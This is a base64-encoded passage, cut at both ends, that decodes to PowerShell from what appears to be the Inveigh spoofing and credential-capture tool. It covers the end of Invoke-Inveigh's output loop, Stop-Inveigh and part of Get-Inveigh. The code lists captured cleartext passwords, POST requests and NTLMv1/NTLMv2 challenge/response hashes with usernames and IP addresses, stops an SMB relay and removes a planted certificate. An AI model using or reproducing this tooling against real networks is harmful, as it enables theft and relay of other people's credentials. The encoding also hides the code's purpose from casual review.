CAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCgogICAgICAgICAgICAgICAgICAgIH0gCgogICAgICAgICAgICAgICAgICAgIHskXyAtbGlrZSAiKiByZXNwb25zZSBzZW50IiAtb3IgJF8gLWxpa2UgIiogaWdub3JpbmcgKiIgLW9yICRfIC1saWtlICIqIEhUVFAqcmVxdWVzdCBmb3IgKiIgLW9yICRfIC1saWtlICIqIFByb3h5IHJlcXVlc3QgZm9yICoifQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJENvbnNvbGVPdXRwdXQgLW5lICJMb3ciKQogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gub3V0cHV0X3N0cmVhbV9vbmx5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKCiAgICAgICAgICAgICAgICAgICAgfSAKCiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0gKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJENvbnNvbGVTdGF0dXMgLWFuZCAkY29uc29sZV9zdGF0dXNfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRjb25zb2xlX3N0YXR1c190aW1lb3V0KQogICAgICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guY2xlYXJ0ZXh0X2xpc3QuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEN1cnJlbnQgdW5pcXVlIGNsZWFydGV4dCBjYXB0dXJlczoiICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jbGVhcnRleHRfbGlzdC5Tb3J0KCkKCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkdW5pcXVlX2NsZWFydGV4dCBpbiAkaW52ZWlnaC5jbGVhcnRleHRfbGlzdCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCR1bmlxdWVfY2xlYXJ0ZXh0IC1uZSAkdW5pcXVlX2NsZWFydGV4dF9sYXN0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJHVuaXF1ZV9jbGVhcnRleHQgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAkdW5pcXVlX2NsZWFydGV4dF9sYXN0ID0gJHVuaXF1ZV9jbGVhcnRleHQKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1tIDUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTm8gY2xlYXJ0ZXh0IGNyZWRlbnRpYWxzIGhhdmUgYmVlbiBjYXB0dXJlZCIgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLlBPU1RfcmVxdWVzdF9saXN0LkNvdW50IC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBDdXJyZW50IHVuaXF1ZSBQT1NUIHJlcXVlc3QgY2FwdHVyZXM6IiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guUE9TVF9yZXF1ZXN0X2xpc3QuU29ydCgpCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHVuaXF1ZV9QT1NUX3JlcXVlc3QgaW4gJGludmVpZ2guUE9TVF9yZXF1ZXN0X2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBpZigkdW5pcXVlX1BPU1RfcmVxdWVzdCAtbmUgJHVuaXF1ZV9QT1NUX3JlcXVlc3RfbGFzdCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCR1bmlxdWVfUE9TVF9yZXF1ZXN0ICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9QT1NUX3JlcXVlc3RfbGFzdCA9ICR1bmlxdWVfUE9TVF9yZXF1ZXN0CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guTlRMTXYxX2xpc3QuQ291bnQgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEN1cnJlbnQgdW5pcXVlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgY2FwdHVyZXM6IiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2xpc3QuU29ydCgpCgogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJHVuaXF1ZV9OVExNdjEgaW4gJGludmVpZ2guTlRMTXYxX2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkdW5pcXVlX05UTE12MV9hY2NvdW50ID0gJHVuaXF1ZV9OVExNdjEuU3ViU3RyaW5nKDAsJHVuaXF1ZV9OVExNdjEuSW5kZXhPZigiOiIsKCR1bmlxdWVfTlRMTXYxLkluZGV4T2YoIjoiKSArIDIpKSkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCR1bmlxdWVfTlRMTXYxX2FjY291bnQgLW5lICR1bmlxdWVfTlRMTXYxX2FjY291bnRfbGFzdCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCR1bmlxdWVfTlRMTXYxICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjFfYWNjb3VudF9sYXN0ID0gJHVuaXF1ZV9OVExNdjFfYWNjb3VudAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjFfYWNjb3VudF9sYXN0ID0gJycKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEN1cnJlbnQgTlRMTXYxIElQIGFkZHJlc3NlcyBhbmQgdXNlcm5hbWVzOiIgKyAkaW52ZWlnaC5uZXdsaW5lKQoKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCROVExNdjFfdXNlcm5hbWUgaW4gJGludmVpZ2guTlRMTXYxX3VzZXJuYW1lX2xpc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJE5UTE12MV91c2VybmFtZSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIE5vIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgaGFzaGVzIGhhdmUgYmVlbiBjYXB0dXJlZCIgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLk5UTE12Ml9saXN0LkNvdW50IC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBDdXJyZW50IHVuaXF1ZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVzOiIgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LlNvcnQoKQoKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR1bmlxdWVfTlRMTXYyIGluICRpbnZlaWdoLk5UTE12Ml9saXN0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHVuaXF1ZV9OVExNdjJfYWNjb3VudCA9ICR1bmlxdWVfTlRMTXYyLlN1YlN0cmluZygwLCR1bmlxdWVfTlRMTXYyLkluZGV4T2YoIjoiLCgkdW5pcXVlX05UTE12Mi5JbmRleE9mKCI6IikgKyAyKSkpCgogICAgICAgICAgICAgICAgICAgICAgICBpZigkdW5pcXVlX05UTE12Ml9hY2NvdW50IC1uZSAkdW5pcXVlX05UTE12Ml9hY2NvdW50X2xhc3QpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkdW5pcXVlX05UTE12MiArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICR1bmlxdWVfTlRMTXYyX2FjY291bnRfbGFzdCA9ICR1bmlxdWVfTlRMTXYyX2FjY291bnQKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICR1bmlxdWVfTlRMTXYyX2FjY291bnRfbGFzdCA9ICcnCiAgICAgICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBDdXJyZW50IE5UTE12MiBJUCBhZGRyZXNzZXMgYW5kIHVzZXJuYW1lczoiICsgJGludmVpZ2gubmV3bGluZSkKCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkTlRMTXYyX3VzZXJuYW1lIGluICRpbnZlaWdoLk5UTE12Ml91c2VybmFtZV9saXN0KQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCROVExNdjJfdXNlcm5hbWUgKyAkaW52ZWlnaC5uZXdsaW5lKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBObyBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcyBoYXZlIGJlZW4gY2FwdHVyZWQiICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkY29uc29sZV9zdGF0dXNfc3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaW52ZWlnaC5jb25zb2xlX2lucHV0KQogICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgaWYoW0NvbnNvbGVdOjpLZXlBdmFpbGFibGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9vdXRwdXQgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICBCUkVBSyBjb25zb2xlX2xvb3AKICAgICAgICAgICAgICAgIH0KICAgICAgICAKICAgICAgICAgICAgfQoKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLW0gNQogICAgICAgIH0KCiAgICB9Cgp9CmZpbmFsbHkKewoKICAgIGlmKCRUb29sIC1lcSAyKQogICAgewogICAgICAgICRpbnZlaWdoLnJ1bm5pbmcgPSAkZmFsc2UKICAgIH0KCn0KCn0KI0VuZCBJbnZva2UtSW52ZWlnaAoKZnVuY3Rpb24gU3RvcC1JbnZlaWdoCnsKPCMKLlNZTk9QU0lTClN0b3AtSW52ZWlnaCB3aWxsIHN0b3AgYWxsIHJ1bm5pbmcgSW52ZWlnaCBmdW5jdGlvbnMuCiM+CgppZigkaW52ZWlnaCkKewoKICAgIGlmKCRpbnZlaWdoLnJ1bm5pbmcgLW9yICRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICB7CgogICAgICAgIGlmKCRpbnZlaWdoLkhUVFBTIC1hbmQgISRpbnZlaWdoLkhUVFBTX2V4aXN0aW5nX2NlcnRpZmljYXRlIC1vciAoJGludmVpZ2guSFRUUFNfZXhpc3RpbmdfY2VydGlmaWNhdGUgLWFuZCAkaW52ZWlnaC5IVFRQU19mb3JjZV9jZXJ0aWZpY2F0ZV9kZWxldGUpKQogICAgICAgIHsKCiAgICAgICAgICAgIHRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuWDUwOUNlcnRpZmljYXRlcy5YNTA5U3RvcmUoIk15IiwiTG9jYWxNYWNoaW5lIikKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5PcGVuKCdSZWFkV3JpdGUnKQogICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlcyA9IChHZXQtQ2hpbGRJdGVtIENlcnQ6XExvY2FsTWFjaGluZVxNeSB8IFdoZXJlLU9iamVjdCB7JF8uSXNzdWVyIC1MaWtlICJDTj0iICsgJGludmVpZ2guY2VydGlmaWNhdGVfaXNzdWVyfSkKCiAgICAgICAgICAgICAgICBGb3JFYWNoKCRjZXJ0aWZpY2F0ZSBpbiAkY2VydGlmaWNhdGVzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5SZW1vdmUoJGNlcnRpZmljYXRlKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCJTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIgfCBPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZCAgIAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiKSAgPiAkbnVsbAogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgIGlmKCRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggUmVsYXkgZXhpdGVkIiB8IE91dC1GaWxlICRJbnZlaWdoLmxvZ19vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gSW52ZWlnaCBSZWxheSBleGl0ZWQiKSAgPiAkbnVsbAogICAgICAgICAgICB9CgogICAgICAgICAgICBXcml0ZS1PdXRwdXQoIkludmVpZ2ggUmVsYXkgZXhpdGVkIGF0ICQoR2V0LURhdGUgLWZvcm1hdCAncycpIikKICAgICAgICAgICAgJGludmVpZ2gucmVsYXlfcnVubmluZyA9ICRmYWxzZQoKICAgICAgICB9IAoKICAgICAgICBpZigkaW52ZWlnaC5ydW5uaW5nKQogICAgICAgIHsKCiAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIGV4aXRlZCIgfCBPdXQtRmlsZSAkSW52ZWlnaC5sb2dfb3V0X2ZpbGUgLUFwcGVuZAogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEludmVpZ2ggZXhpdGVkIikgID4gJG51bGwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCJJbnZlaWdoIGV4aXRlZCBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICRpbnZlaWdoLnJ1bm5pbmcgPSAkZmFsc2UKICAgICAgICAgICAgCiAgICAgICAgfQoKICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgIFN0YXJ0LVNsZWVwIC1TIDUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBXcml0ZS1PdXRwdXQoIlRoZXJlIGFyZSBubyBydW5uaW5nIEludmVpZ2ggZnVuY3Rpb25zIikKICAgIH0KCn0KCn0KCmZ1bmN0aW9uIEdldC1JbnZlaWdoCnsKPCMKLlNZTk9QU0lTCkdldC1JbnZlaWdoIHdpbGwgZ2V0IHN0b3JlZCBJbnZlaWdoIGRhdGEgZnJvbSBtZW1vcnkuCgouUEFSQU1FVEVSIENvbnNvbGUKR2V0IHF1ZXVlZCBjb25zb2xlIG91dHB1dC4gVGhpcyBpcyBhbHNvIHRoZSBkZWZhdWx0IGlmIG5vIHBhcmFtZXRlcnMgYXJlIHNldC4KCi5QQVJBTUVURVIgTGVhcm5pbmcKR2V0IHZhbGlkIGhvc3RzIGRpc2NvdmVyZWQgdGhyb3VnaCBzcG9vZmVyIGxlYXJuaW5nLgoKLlBBUkFNRVRFUiBMb2cKR2V0IGxvZyBlbnRyaWVzLgoKLlBBUkFNRVRFUiBDbGVhcnRleHQKR2V0IGNhcHR1cmVkIGNsZWFydGV4dCBjcmVkZW50aWFscy4KCi5QQVJBTUVURVIgQ2xlYXJ0ZXh0VW5pcXVlCkdldCB1bmlxdWUgY2FwdHVyZWQgY2xlYXJ0ZXh0IGNyZWRlbnRpYWxzLgoKLlBBUkFNRVRFUiBOVExNdjEKR2V0IGNhcHR1cmVkIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgaGFzaGVzLgoKLlBBUkFNRVRFUiBOVExNdjFVbmlxdWUKR2V0IHRoZSBmaXJzdCBjYXB0dXJlZCBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGZvciBlYWNoIHVuaXF1ZSBhY2NvdW50LgoKLlBBUkFNRVRFUiBOVExNdjFVc2VybmFtZXMKR2V0IElQIGFkZHJlc3NlcyBhbmQgdXNlcm5hbWVzIGZvciBjYXB0dXJlZCBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcy4KCi5QQVJBTUVURVIgTlRMTXYyCkdldCBjYXB0dXJlZCBOVExNdjEgY2hhbGxlbmdlL3Jlc3BvbnNlIGhhc2hlcy4KCi5QQVJBTUVURVIgTlRMTXYyVW5pcXVlCkdldCB0aGUgZmlyc3QgY2FwdHVyZWQgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgZWFjaCB1bmlxdWUgYWNjb3VudC4KCi5QQVJBTUVURVIgTlRMTXYyVXNlcm5hbWVzCkdldCBJUCBhZGRyZXNzZXMgYW5kIHVzZXJuYW1lcyBmb3IgY2FwdHVyZWQgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBoYXNoZXMuCgouUEFSQU1FVEVSIFBPU1RSZXF1ZXN0CkdldCBjYXB0dXJlZCBQT1NUIHJlcXVlc3RzLgoKLlBBUkFNRVRFUiBQT1NUUmVxdWVzdFVuaXF1ZQpHZXQgdW5pcXVlIGNhcHR1cmVkIFBPU1QgcmVxdWVzdC4KIz4KCltDbWRsZXRCaW5kaW5nKCldCnBhcmFtCiggCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTd2l0Y2hdJENsZWFydGV4dCwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kQ2xlYXJ0ZXh0VW5pcXVlLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3dpdGNoXSRDb25zb2xlLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3dpdGNoXSRMZWFybmluZywKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kTG9nLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3dpdGNoXSROVExNdjEsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTd2l0Y2hdJE5UTE12MiwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kTlRMTXYxVW5pcXVlLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3dpdGNoXSROVExNdjJVbmlxdWUsCiAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXVtTd2l0Y2hdJE5UTE12MVVzZXJuYW1lcywKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kTlRMTXYyVXNlcm5hbWVzLAogICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV1bU3dpdGNoXSRQT1NUUmVxdWVzdCwKICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldW1N3aXRjaF0kUE9TVFJlcXVlc3RVbmlxdWUsCiAgICBbcGFyYW1ldGVyKFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cz0kdHJ1ZSldJGludmFsaWRfcGFyYW1ldGVyCikKCmlmKCRDb25zb2xlIC1vciAkUFNCb3VuZFBhcmFtZXRlcnMuQ291bnQgLWVxIDApCnsKCiAgICB3aGlsZSgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkNvdW50IC1ndCAwKQogICAgewoKICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuUmVtb3ZlQXQoMCkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKCiAgICAgICAgICAgIHN3aXRjaCAtd2lsZGNhcmQgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0pCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICB7JF8gLWxpa2UgIiogd3JpdHRlbiB0byAqIiAtb3IgJF8gLWxpa2UgIiogZm9yIHJlbGF5ICoiIC1vciAkXyAtbGlrZSAiKlNNQiByZWxheSAqIiAtb3IgJF8gLWxpa2UgIiogbG9jYWwgYWRtaW5pc3RyYXRvciAqIn0KICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICRpbnZlaWdoLmNvbnNvbGVfcXVldWVbMF0KICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZGVmYXVsdAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CiAgICAgICAgIAogICAgfQoKfQoKaWYoJExvZykKewogICAgV3JpdGUtT3V0cHV0ICRpbnZlaWdoLmxvZwp9CgppZigkTlRMTXYxKQp7CiAgICBXcml0ZS1PdXRwdXQgJGludmVpZ2guTlRMTXYxX2xpc3QKfQoKaWYoJE5UTE12MVVuaXF1ZSkKewogICAgJGludmVpZ2guTlRMTXYxX2xpc3QuU29ydCgpCgogICAgZm9yZWFjaCgkdW5pcXVlX05UTE12MSBpbiAkaW52ZWlnaC5OVExNdjFfbGlzdCkKICAgIHsKICAgICAgICAkdW5pcXVlX05UTE12MV9hY2NvdW50ID0gJHVuaXF1ZV9OVExNdjEuU3ViU3RyaW5nKDAsJHVuaXF1ZV9OVExNdjEuSW5kZXhPZigiOiIsKCR1bmlxdWVfTlRMTXYxLkluZGV4T2YoIjoiKSArIDIpKSkKCiAgICAgICAgaWYoJHVuaXF1ZV9OVExNdjFfYWNjb3VudCAtbmUgJHVuaXF1ZV9OVExNdjFfYWNjb3VudF9sYXN0KQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICR1bmlxdWVfTlRMTXYxCiAgICAgICAgfQoKICAgICAgICAkdW5pcXVlX05UTE12M